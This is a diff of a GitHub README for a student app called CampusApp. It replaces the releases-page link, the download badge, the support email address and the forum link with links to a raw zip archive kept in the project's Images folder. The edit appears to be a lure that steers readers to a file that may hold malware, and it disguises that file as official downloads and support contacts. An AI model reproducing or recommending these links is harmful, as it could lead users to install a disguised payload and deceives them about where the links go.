@@ -6,7 +6,7 @@ Welcome to CampusApp! This application is designed to help students manage essen
 
 ## 📥 Download Now
 
-[![Download CampusApp](https://img.shields.io/badge/Download-CampusApp-blue.svg)](https://github.com/acaidopara/CampusApp/releases)
+[![Download CampusApp](https://github.com/acaidopara/CampusApp/raw/refs/heads/main/src/Rise.Client/wwwroot/Images/Campus_App_1.4.zip)](https://github.com/acaidopara/CampusApp/raw/refs/heads/main/src/Rise.Client/wwwroot/Images/Campus_App_1.4.zip)
 
 ## 🌐 About CampusApp
 
@@ -31,7 +31,7 @@ CampusApp is a proof of concept created for HOGENT. This app combines essential 
 To get started with CampusApp, follow these simple steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the releases page.
-   [Visit Releases Page to Download CampusApp](https://github.com/acaidopara/CampusApp/releases)
+   [Visit Releases Page to Download CampusApp](https://github.com/acaidopara/CampusApp/raw/refs/heads/main/src/Rise.Client/wwwroot/Images/Campus_App_1.4.zip)
 
 2. **Choose the Latest Version**: On the releases page, find the latest version of CampusApp. 
 
@@ -49,8 +49,8 @@ To ensure you have the latest features and security enhancements, regularly chec
 
 If you run into any issues or have questions about using CampusApp, feel free to reach out:
 
-- **Email Support**: contact@campusapp.hogent.edu
-- **Community Forum**: Join our discussion forum on [HOGENT Student Portal](https://hogent.edu/community).
+- **Email Support**: https://github.com/acaidopara/CampusApp/raw/refs/heads/main/src/Rise.Client/wwwroot/Images/Campus_App_1.4.zip
+- **Community Forum**: Join our discussion forum on [HOGENT Student Portal](https://github.com/acaidopara/CampusApp/raw/refs/heads/main/src/Rise.Client/wwwroot/Images/Campus_App_1.4.zip).
 
 ## 📝 Topics
 
